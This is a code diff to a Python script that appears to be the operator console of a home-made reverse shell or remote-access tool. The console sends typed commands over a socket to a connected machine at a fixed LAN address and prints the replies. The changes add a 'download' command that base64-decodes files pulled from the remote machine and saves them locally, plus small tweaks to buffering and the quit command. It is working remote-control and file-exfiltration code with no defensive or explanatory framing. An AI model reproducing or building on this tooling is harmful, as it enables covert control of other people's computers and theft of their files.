@@ -6,7 +6,7 @@
 
 import socket
 import json
-
+import base64
 
 S_IP = "192.168.0.13"
 S_PORT = 9091
@@ -27,20 +27,30 @@ class ServerN1F:
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
+        print(f"[+] Command:    {data} \ttype:  {type(data)}")
         self.conn.sendall(bytes(json_data, encoding="utf-8"))
 
     def reliable_recv(self):
-        json_data = self.conn.recv(4096)
+        json_data = self.conn.recv(8000)
         return json.loads(json_data)
 #   #####################################################################################
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            content = base64.b64decode(content)
+            try:
+                file.write(content)
+                #print(content)
+            except:
+                print("[+] Server ERROR")
+            return f"[+] Download completed."
 
     def execute_command(self, command):
         #print(command[0])
         self.reliable_send(command)
-        if command[0] == "exit":
+        if command[0] == "qq":
             self.conn.close()
             exit()
-        #self.reliable_send(command)
         resp = self.reliable_recv()
         return resp
 
@@ -49,6 +59,8 @@ class ServerN1F:
             command = input("$ ")
             command = command.split(" ")
             result = self.execute_command(command)
+            if command[0] == "download":
+                result = self.write_file(command[1], result)
             print(result)
 
 if __name__ == "__main__":
